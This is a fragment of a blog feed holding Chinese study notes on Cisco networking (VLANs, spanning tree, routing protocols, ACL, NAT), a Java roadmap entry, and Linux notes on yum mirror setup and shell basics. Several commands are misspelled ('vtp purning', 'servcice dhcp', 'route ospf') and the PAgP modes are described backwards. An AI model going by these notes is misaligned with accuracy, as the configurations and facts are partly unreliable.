title="VLAN"></a>VLAN</h2><ol><li>vlan的优点<ol><li>限制网络上的广播，有助于控制流量</li><li>降低成本</li><li>简化网络管理，提高网络连接灵活性</li><li>增强局域网安全性</li></ol></li><li>Vlan划分方式类型<ol><li>静态vlan：基于端口vlan，即指名各端口属于哪个vlan<ul><li><pre><code>基于端口的vlan缺点</code></pre><ol><li>安全问题：物理攻击</li><li>灵活性差，配置便捷性差</li></ol></li></ul></li><li>动态vlan：MAC based VLAN、Subnet based VLAN、User Based VLAN</li></ol></li><li>VLAN配置相关参数<ul><li>access：主机连交换机、终端</li><li>trunk：交换机互联</li><li>range： 范围    </li><li>PVID：（port vlan id）端口的vlanID号</li></ul></li><li>IEEE802.1Q：<ol><li>封装：将VLAN信息加入数据帧的包头，据有加标记能力的端口将会执行封装</li><li>去封装：VLAN信息从数据帧头去掉，具有去封装能力的端口将会执行解封装<br> <img src="/:/d3d834ddc68a463782df866e5ee281d7" alt="64aac2f1d32778beaa3638d2943075ed.png"></li></ol></li></ol></li><li><h2 id="VTP-VLAN-Trunking-Protocol-思科私有协议"><a href="#VTP-VLAN-Trunking-Protocol-思科私有协议" class="headerlink" title="VTP (VLAN Trunking Protocol 思科私有协议)"></a>VTP (VLAN Trunking Protocol 思科私有协议)</h2><ul><li>VTP：VLAN中继协议 &#x2F; 虚拟局域网干道协议 （配置统一性：对VLAN进行统一管理）</li><li>三种工作模式：<ol><li>&#x3D;&#x3D;VTP Server&#x3D;&#x3D;：<ul><li>可建删修改vlan</li><li>可发送并转发相关通告信息，同步vlan配置</li><li>配置保存在NVRAM</li></ul></li><li>VTP Client ：<ul><li>不可建删修改vlan</li><li>但可转发通告、同步</li><li>不保存配置到NVRAM</li></ul></li><li>VTP Transparent：相当于独立的交换机，不参与vtp工作，不从vtp server学习，只拥有本设备上自维护的vlan信息</li></ol></li></ul><ol><li>VTP相关操作<ol><li>前置配置：trunk <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># switchport mode trunk</span><br></pre></td></tr></table></figure></li><li>协议配置 <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vtp mode &#123;server|client|transparent&#125;//配置vtp模式</span><br><span class="line"># vtp domain &#123;test&#125;//配置域名，默认为空</span><br><span class="line"># vtp password &#123;cisco&#125;//配置pwd</span><br><span class="line"># vtp version 2//配置version</span><br></pre></td></tr></table></figure></li><li>vtp裁减  <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vtp purning//启用裁减，只需在server上配置</span><br></pre></td></tr></table></figure></li></ol><ul><li>显示信息：<code>show vtp status</code><h1 id="网络优化-amp-安全策略"><a href="#网络优化-amp-安全策略" class="headerlink" title="网络优化 &amp; 安全策略"></a>网络优化 &amp; 安全策略</h1></li></ul></li></ol></li><li><h2 id="生成树协议（STP）"><a href="#生成树协议（STP）" class="headerlink" title="生成树协议（STP）"></a>生成树协议（STP）</h2><ul><li>STA：生成树算法</li><li>BPDU：桥接协议数据单元（Bridge Protocol Data Unit）「两层」<ol><li>版本号 00（IEEE802.1D）；02（IEEE802.1w）</li><li>Bridge ID：交换机ID &#x3D; 交换机优先级 + 交换机mac地址</li><li>Root ID：桥ID最小的位根ID</li><li>Root Path Cost：到达根的路径开销</li><li>PortID</li><li>Hello Time：定期发送BPDU的时间间隔</li><li>Max-Age Time：保留对方BPDU的时间间隔</li><li>Forward-Delay Time发送延迟：端口状态改变的时间间隔</li></ol></li><li>BID：网桥ID（Bridge ID）</li><li>Root Bridge：根网桥（桥ID最小）</li><li>Root Ports：根端口（到达根桥最佳路径）</li><li>Designated Ports：指定端口</li><li>Alternated Port：可选端口（既不是指定端口也不是根端口）</li></ul><ol><li>生成树协议端口状态<ol><li>禁用(Disabled)：关闭端口</li><li>阻塞(Blocking)：不能接收或传输数据，不能吧mac地址加入地址表，只接收BPDU</li><li>监听(Listening)：由根端口和指定端口担任，不能转发和传输，不能mac加入地址表，只能接收或发送BPDU</li><li>学习(Learning)</li><li>转发(Forwarding)</li></ol></li><li>生成树协议配置<ol><li>交换机优先级</li><li>端口优先级</li><li>配置HelloTime</li><li>配置Forward-Delay Time</li><li>配置Max-AgeTime</li></ol><ul><li>Cisco系列SpanningTree默认配置：（# spanning-tree reset）<ul><li>生成树协议PVST</li><li>STP启用</li><li>STP Proority：32768</li><li>STP port Priority：128</li><li>STP port cost：根据端口速率自动判断</li><li>Hello Time：2s</li><li>Forward-delay Time：15s</li><li>Max-age Time：20s</li></ul><ol><li><p>启用生成树协议 &#x2F; 关闭生成树协议</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Spanning-tree</span><br><span class="line">no Spanning-tree</span><br></pre></td></tr></table></figure></li><li><p>配置生成树协议类型</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spanning-tree mode stop/rstp/mstp</span><br></pre></td></tr></table></figure></li><li><p>配置交换机优先级</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># spanning-tree priority 4096</span></span><br></pre></td></tr></table></figure></li><li><p>优先级恢复默认值</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no spanning-tree priority</span><br></pre></td></tr></table></figure></li><li><p>配置交换机端口优先级</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int f0/0</span><br><span class="line">spanning-tree vlan 10 </span><br></pre></td></tr></table></figure></li><li><p>显示生成树状态</p></li><li><p>显示端口生成树协议状态</p></li></ol></li></ul></li><li>快速生成树协议（RSTP）：生成树改进，解决收敛慢问题<ol><li>改进方案<ol><li>为根端口和指定端口设置了快速切换用的替换端口（Alternate Port）和备份端口（Backup Port）</li><li>在只连接了两个交换端口的点对点链路中，指定端口只需与下游交换机进行一次握手就可以无时延地进入转发状态</li><li>直接与终端相连而不是把其他交换机相连的端口定义为边缘端口（Edge Port）。边缘端口可以直接进入转发状态，不需要任何延时。</li></ol></li><li>端口三种状态<ol><li>Discarding</li><li>Learning</li><li>Forwarding</li></ol><ul><li>对比一般生成树少了监听listening和阻塞blocking</li></ul></li><li>基于vlan的RSTP <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># show spanning-tree vlan 20</span></span><br></pre></td></tr></table></figure></li></ol></li><li>多生成树（MSTP）</li></ol></li><li><h2 id="端口聚合（Ethernet-Channel-以太通道）"><a href="#端口聚合（Ethernet-Channel-以太通道）" class="headerlink" title="端口聚合（Ethernet Channel 以太通道）"></a>端口聚合（Ethernet Channel 以太通道）</h2><ul><li>一组物理端口联合成一个逻辑通道，即通道组，此逻辑通道视作一个端口</li><li>自动提供冗余和负载均衡</li></ul><ol><li>端口聚合类型<ol><li>手工静态配置</li><li>动态协议聚合<ol><li>PAgA（思科私有）<ul><li>On：通道成员不协商，直接开启端口聚合（静态）</li><li>auto：主动</li><li>desirable：被动协商，不发送，只接受协商消息</li><li>Off：关闭</li></ul></li><li>LACP<ul><li>active：主动</li><li>passive：被动协商，不发送，只接受协商消息</li><li>On</li><li>Off</li></ul></li></ol></li></ol></li><li>链路聚合配置<ul><li>先配置后连线（连线后会生成环路，阻塞） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># int range f0/1-2</span><br><span class="line"># channel-group 10 mode on//f1-2加入逻辑端口组10号</span><br><span class="line"># port-channel load-balance mothod//设置端口负载均衡算法</span><br></pre></td></tr></table></figure> 查看端口配置状态 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># show etherchannel summary</span><br></pre></td></tr></table></figure><h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1></li></ul></li></ol></li><li><h2 id="路由器概述"><a href="#路由器概述" class="headerlink" title="路由器概述"></a>路由器概述</h2><ul><li>基本功能<ol><li>网络互连</li><li>数据处理</li><li>网络管理</li></ol></li><li>分类<ol><li>固定配置路由器</li><li>模块化路由器</li></ol></li><li>控制线缆<ol><li>以太网线缆</li><li>控制台线缆</li><li>串行广域网线缆</li></ol></li><li>常用配置方式<ol><li>控制台方式</li><li>Telnet方式</li><li>网管工作站方式</li><li>TFTP服务器方式</li></ol></li></ul></li><li><h2 id="路由器基础配置"><a href="#路由器基础配置" class="headerlink" title="路由器基础配置"></a>路由器基础配置</h2></li><li><h2 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h2><ul><li>将路由器的一个物理接口当成多个逻辑接口使用（通过一个逻辑子接口实现物理端口以一当多的功能） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int g0/0.1</span><br><span class="line">R(config-subif)# encapsulation dot1Q 10</span><br><span class="line">ip address 192.168.1.254 255.255.255.0</span><br><span class="line">int g0/0.2</span><br><span class="line">R(config-subif)# encapsulation dot1Q 20</span><br><span class="line">ip address 192.168.2.254 255.255.255.0</span><br><span class="line">no shutdown</span><br><span class="line">int g0/0</span><br><span class="line">no shutdown</span><br></pre></td></tr></table></figure></li></ul></li><li><h2 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">servcice dhcp //启动dhcp服务</span><br><span class="line">ip dhcp pool abc //创建地址池abc</span><br><span class="line">network 192.168.1.0 255.255.255.0 //配置地址池范围</span><br><span class="line">default-router 192.168.1.254 //默认路由</span><br><span class="line">dns-server 1.1.1.1 //配置dns</span><br><span class="line"></span><br><span class="line">//排除特定ip地址</span><br><span class="line">ip dhcp excluded-address 192.168.1.254 </span><br><span class="line">ip dhcp excluded-address 192.168.2.254 </span><br><span class="line">ip dhcp excluded-address 192.168.1.1 192.168.1.100 //排除多个</span><br><span class="line">//结合switch vlan配置</span><br><span class="line">int vlan 10</span><br><span class="line">ip add 192.168.1.254 255.255.255.0</span><br></pre></td></tr></table></figure></li><li><h2 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h2></li></ol><ul><li><code>ip helper-address</code>：路由器是不转达发广播的，帮助地址通过将这些广播数据包直接转发到目标服务器而帮助客户机和服务器建立联系。<br>  <img src="/:/e46a9e6d7e694960969c777472eebc9a" alt="01b5f91bbd027d7ab3ded4b79f824a78.png"> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int g0/0</span><br><span class="line">ip helper-address 192.168.12.1</span><br></pre></td></tr></table></figure><h1 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h1></li></ul><ol><li><h2 id="动态路由协议基础概念"><a href="#动态路由协议基础概念" class="headerlink" title="动态路由协议基础概念"></a>动态路由协议基础概念</h2><ul><li>Cisco三种路由方式<ol><li>静态路由：手工定义目的地和路由转发</li><li>动态路由：路由器根据路由表灵活调整</li><li>默认路由：当前路由表中无匹配表项时，做出的默认选择</li></ol></li><li>动态路由优势：<ul><li>灵活调整路由表，选择最优路径</li><li>均衡负载（Load Sharing）</li></ul></li></ul><ol><li>自治域系统</li><li>路由协议分类</li><li>邻居关系</li><li>网络路径的度量</li><li>收敛时间</li></ol></li><li><h2 id="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"><a href="#RIP协议（典型的距离矢量路由选择算法的内部网关协议）" class="headerlink" title="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"></a>RIP协议（典型的距离矢量路由选择算法的内部网关协议）</h2><ol><li>特征<ul><li>距离矢量：以跳数为度量值（metric）的距离向量协议</li><li>RIP基于UDP，端口520的应用层协议</li><li>跳数不超过15</li></ul></li><li>分类<ol><li>RIPv1<ul><li>有类路由协议</li><li>没有认证功能</li><li>没有手工汇总功能</li><li>广播更新</li></ul></li><li>RIPv2<ul><li><strong>无类路由协议</strong>（不规则IP地址，如10.xx.xx.xx 255.255.255.0）</li><li>支持明文和MD5认证功能</li><li>可在关闭自动汇总功能前提下，进行手工汇总</li><li>组播更新</li></ul></li></ol></li><li>RIP配置<ul><li>配置步骤：<ol><li>配置路由器接口ip</li><li>配置路由RIP</li><li>DHCP服务配置</li><li>测试 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">启用</span><br><span class="line"><span class="section"># router rip</span></span><br><span class="line">查看路由表</span><br><span class="line">添加网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">删除网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">将版本改为RIPv2</span><br><span class="line"><span class="section"># version 2</span></span><br><span class="line"><span class="section"># no auto-summary</span></span><br><span class="line"><span class="section"># show ip router  </span></span><br><span class="line"><span class="code">&gt; R192.168.xx.0/24[120/?] </span></span><br><span class="line"><span class="code">1. ？: 标识RIP传递跳数) </span></span><br><span class="line"><span class="code">2. 120：管理距离</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure></li></ol></li></ul></li></ol></li><li><h2 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int s1/2</span><br><span class="line">ip add 10.1.1.1 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">clockrate 64000</span><br><span class="line">route ospf</span><br><span class="line">network 10.1.1.0 0.0.0.255 area 0</span><br><span class="line">network 192.168.1.0 0.0.0.255 area 0</span><br><span class="line">//查看</span><br><span class="line">show running-config</span><br></pre></td></tr></table></figure></li><li><h2 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h2><ul><li>EIGRP（Enhanced Interior Gateway Routing Protocol）：<strong>增强内部网关路由协议 &#x2F; 加强型内部网关路由协议</strong></li><li>特点：<ol><li>快速收敛</li><li>部分更新</li><li>支持多种网络层协议</li><li>单播和多播</li><li>支持变长子网掩码</li><li>无缝连接数链层协议和拓扑结构</li><li>配置简单</li></ol></li><li>工作原理：（3张表）邻居表、拓扑表、路由表【使用可靠传输协议RTP】</li><li>配置方式  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">router eigrp autonomous-system</span><br></pre></td></tr></table></figure></li></ul></li><li><h2 id="路由重发布"><a href="#路由重发布" class="headerlink" title="路由重发布"></a>路由重发布</h2><ul><li>将其学习到的一种路由协议的路由通过路由协议广播出去</li><li>ASBR：AS边界路由器</li><li>要点关注<ol><li>管理距离</li><li>metric问题（路由度量值）</li></ol></li><li>配置  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redistribute</span><br></pre></td></tr></table></figure></li><li>内网映射：在路由器R2上配置静态NAT将内部服务<code>192.168.10.10</code>的地址转换为<code>202.101.1.10</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source static 192.168.10.10 202.101.1.10</span><br><span class="line">int f0/0 //服务器端方向</span><br><span class="line">ip nat inside</span><br><span class="line">int f0/1 //客户端方向</span><br><span class="line">ip nat outside</span><br></pre></td></tr></table></figure><h1 id="访问控制列表-ACL"><a href="#访问控制列表-ACL" class="headerlink" title="访问控制列表 ACL"></a>访问控制列表 ACL</h1></li></ul></li></ol><ul><li>基于包过滤的访问控制技术（保证网络资源安全的核心策略之一）</li><li>根据设定的条件对接口上的数据包进行过滤，允许通过或丢弃<h2 id="ACL常适用场景"><a href="#ACL常适用场景" class="headerlink" title="ACL常适用场景"></a>ACL常适用场景</h2></li></ul><ol><li>网络地址转换 NAT</li><li>按需拨号路由 DDR</li><li>路由重发布</li><li>策略路由 PBR</li></ol><ul><li>ACL工作原理：在路由器上读取OSI七层模型中的第三层和第四层包头中的信息<img src="/:/836c2a195c384ae096f79b4fa89fed6f" alt="8de9b5e85617b42cb7ba80e44b4cd336.png"><h2 id="ACL分类"><a href="#ACL分类" class="headerlink" title="ACL分类"></a>ACL分类</h2></li></ul><ol><li>标准IP访问控制列表：只允许过滤源地址</li><li>扩展IP访问控制列表：允许过滤源地址、目的地址、上层应用数据</li><li>命名访问控制列表：可以删除某一条特点控制条目，使用一个字母或数字组合的字符串代替前面所使用的数字</li><li>基于时间的访问控制列表：定义一个时间范围，在原来的各种访问列表的基础上应用它<h2 id="ACL配置注意事项"><a href="#ACL配置注意事项" class="headerlink" title="ACL配置注意事项"></a>ACL配置注意事项</h2></li><li>最小特权原则</li><li>自上而下的处理过程</li><li>添加表项（新增表项被追加到访问列表表尾，意味着不能改变已有访问列表功能，因此改变必须创建新列表）</li><li>访问列表位置（扩展访问列表尽量放靠近过滤源的位置上）</li><li>访问列表应用：<code>access-group</code>只能应用于接口上才执行过滤操作</li><li>过滤方向：通过接口的数据流是双向的<ul><li>Outbound 向外的：数据量从三层设备流出</li><li>Inbound 向内的：数据流流向三层设备<h1 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h1></li></ul></li><li>概念：NAT是一种将一个IP地址域转换成另一个IP地址域的技术。</li><li>目的：解决IP地址短缺问题</li><li>应用：多个内网地址映射到一个外网地址，外部网络主机有选择的访问内部网络。</li><li>相关术语<ol><li>私有地址（“不可路由的”地址）：只能在一个组织或机构内部使用，不能在整个Internet范围使用【范围：<code>10.0.0.0 ~ 10.255.255.255</code>、<code>172.16.0.0 ~ 172.31.255.255</code>、<code>192.168.0.0 ~ 192.168.255.255</code>】</li><li>公有地址（“可路由的地址”、“合法地址”）：需要向Internet注册阻止申请并按照分配范围使用</li><li>内部网络</li><li>外部网络</li><li>内部本地地址</li><li>内部全局地址：向ICANN申请取得的公有IP地址</li><li>外部本地地址：不一定是公有IP地址</li><li>外部全局地址：全局可路由的公有IP地址<h2 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h2><h2 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h2><h2 id="端口复用NAT"><a href="#端口复用NAT" class="headerlink" title="端口复用NAT"></a>端口复用NAT</h2><h1 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1></li></ol></li></ol><ul><li>冒分十六进制表示法：格式<code>X:X:X:X:X:X:X:X</code>，X表示地址种的16b，以十六进制表示</li><li>0位压缩表示法</li><li>内嵌IPv4地址表示法</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;交换机&quot;&gt;&lt;a href=&quot;#交换机&quot; class=&quot;headerlink&quot; title=&quot;交换机&quot;&gt;&lt;/a&gt;交换机&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;交换机switch的基本功能&lt;ol&gt;
&lt;li&gt;学习功能&lt;/li&gt;
&lt;li&gt;转发&amp;#x2F;过滤&lt;/li&gt;
&lt;li&gt;支持冗</summary>
      
    
    
    
    <category term="计算机综合" scheme="https://dxhm.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%BC%E5%90%88/"/>
    
    
    <category term="交换机" scheme="https://dxhm.github.io/tags/%E4%BA%A4%E6%8D%A2%E6%9C%BA/"/>
    
    <category term="路由器" scheme="https://dxhm.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>JAVA学习路线图</title>
    <link href="https://dxhm.github.io/2022/03/23/JAVA-STUDY/"/>
    <id>https://dxhm.github.io/2022/03/23/JAVA-STUDY/</id>
    <published>2022-03-23T08:08:37.000Z</published>
    <updated>2023-06-30T10:46:07.628Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png"></p><blockquote><p>FROM：(B站UP主) 不高兴就喝水</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FROM：(B站UP主) 不高兴就喝水&lt;/p&gt;
&lt;/blockquot</summary>
      
    
    
    
    <category term="JAVA" scheme="https://dxhm.github.io/categories/JAVA/"/>
    
    
    <category term="编程语言" scheme="https://dxhm.github.io/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="java" scheme="https://dxhm.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>LINUX OS</title>
    <link href="https://dxhm.github.io/2022/03/22/LINUX-OS/"/>
    <id>https://dxhm.github.io/2022/03/22/LINUX-OS/</id>
    <published>2022-03-22T08:01:54.000Z</published>
    <updated>2023-06-30T13:54:35.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol><li><p>MBR：主引导记录</p></li><li><p>grub2引导 (grub「grand unified bootloader 宏大的统一引导启动程序」：幼虫，搜寻)</p><ol><li>boot.img</li><li>core.img</li><li>*.mod</li><li>grub.cfg a. 未独立&#x2F;boot：&#x2F;boot&#x2F;grub2&#x2F;grub.cfg b. 独立&#x2F;boot:&#x2F;grub2&#x2F;grub.cfg</li><li>grun2-setpassword：设置引导密码</li></ol></li><li><p>init：PID&#x3D;1（进程号）</p><ol><li>centos7第一个进程：systemd（配置文件：&#x2F;usr&#x2F;system&#x2F;systemd&#x2F;）</li><li>执行登录 &#x2F;bin&#x2F;login</li></ol></li><li><p>demesg | less：“|”管道符，左侧命令输出作为右侧的输入</p></li><li><p>&#x2F;dev：设备 –&gt; 文件</p></li><li><p>&#x2F;usr：unix shared resources（共享资源）「类似win的Program Files」</p></li><li><p>&#x2F;src：原文件</p></li><li><p>&#x2F;tmp：临时文件</p></li><li><p>&#x2F;var（variable）：日志文件、打印机脱机工作文件、缓冲区</p></li><li><p>&#x2F;opt（option）：选项文件</p></li><li><p>&#x2F;mnt（mount）：挂载</p></li><li><p>cd：change directory</p></li><li><p>文件类型：</p><ol><li>d：目录</li><li>l：链接</li><li>b：块设备</li><li>c：字符设备文件</li><li>-：普通文件</li></ol></li><li><p>文件权限：</p><ol><li>用户组：U &#x2F; G &#x2F; A</li><li>九位字母表示法：d[文件类型] rwx[文件属主] r-x[同组用户] r–[其他用户]</li></ol></li><li><p>cat快速编辑：</p><ol><li>cat&gt;test</li><li>[输入字符]</li></ol></li><li><p>tail &amp; head：查看后十行，前十行 &#x2F;&#x2F;-n num : 指定行数</p></li><li><p>mdir [ -m ] [ -p 目录名 ]</p></li><li><p>rmdir（remove dir）：用于删除空目录</p><ol><li>rm -r</li></ol></li><li><p>touch：修改时间属性 * （不存在）创建文件</p></li><li><p>软链接：ln -s</p></li><li><p>硬链接：ln</p><ol><li>以文件副本形式存在，不占用实际控件</li><li>不允许目录硬链接</li><li>只有在同一个文件系统才允许硬链接</li></ol></li><li><p>查找类：which、whereis、find、grep</p></li><li><p>文件重定向：</p><ul><li>&#x2F;dev&#x2F;stdin：标准输入文件</li><li>&#x2F;dev&#x2F;stdout：标准输出文件</li></ul><ol><li><p>输出重定向</p><ol><li>“&gt;”：文件存在，覆盖</li><li>“&gt;&gt;”：文件存在，添加内容到文件末尾</li></ol></li><li><p>输入重定向</p><ol><li>“&lt;”</li></ol></li><li><p>管道符重定向：“|” 左输出为右输入</p><h1 id="yum包管理"><a href="#yum包管理" class="headerlink" title="yum包管理"></a>yum包管理</h1></li></ol></li></ol><ul><li><p>centos镜像源文件的目录默认路径：<br><code>/etc/yum.repos.d/</code></p></li><li><p>备份：<br><code>cp /etc/yum.repos.d/CentOS-Linux-BaseOS.repo /etc/yum.repos.d/CentOS-Linux-BaseOS.repo.bak</code></p></li></ul><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><ul><li><p>下载国内常用的镜像源并重命名为CentOS-Linux-BaseOS.repo,将其作为当前系统的镜像源</p><p>  +【阿里源】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##CentOS 8</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure><ul><li><p>在使用阿里云的 centos8 的 yum 时报错：由于centos8 在2022年停止服务，后继版本为8-steam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##CentOS 8-stream</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br></pre></td></tr></table></figure></li><li><p>【网易源】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Linux-BaseOS.repo  http://mirrors.163.com/.help/CentOS8-Base-163.repo</span><br></pre></td></tr></table></figure></li><li><p>『添加epel源』</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo</span><br></pre></td></tr></table></figure></li><li><p>『清华源』：<a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/">Guide</a></p></li></ul></li><li><p>清理缓存</p><p>  yum的缓存文件的存放目录是以下路径下：&#x2F;var&#x2F;cache&#x2F;yum 直接清空给目录，或者使用一下命令均可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure></li><li><p>重新生成缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum makecache</span><br><span class="line">yum clean all</span><br><span class="line">yum info [pagename]</span><br><span class="line">yum list</span><br><span class="line">yum search</span><br></pre></td></tr></table></figure><h1 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h1></li></ul><ol><li><h2 id="shell概念"><a href="#shell概念" class="headerlink" title="shell概念"></a>shell概念</h2><ul><li>shell程序就是一个包含若干行shell或者linux命令的文件.</li><li>像编写高级语言的程序一样，编写一个shell程序需要一个文本编辑器.如ⅥM等.</li><li>在文本编辑环境下，依据shell的语法规则，输入一些shell&#x2F;linux命令行，形成一个完整的程序文件.</li><li>执行shell程序文件有三种方法<ol><li>#chmod +x file（在&#x2F;etc&#x2F;profile中，加入export PATH&#x3D;${PATH}:~&#x2F;yourpath，就可以在命令行下直接运行，像执行普通命令一样）</li><li>#. file</li><li>#sh file</li><li>#source file</li></ol></li><li>在编写shell时，第一行一定要指明系统需要那种shell解释你的shell程序（如：#! &#x2F;bin&#x2F;bash,#! &#x2F;bin&#x2F;csh,&#x2F;bin&#x2F;tcsh，还是#! &#x2F;bin&#x2F;pdksh 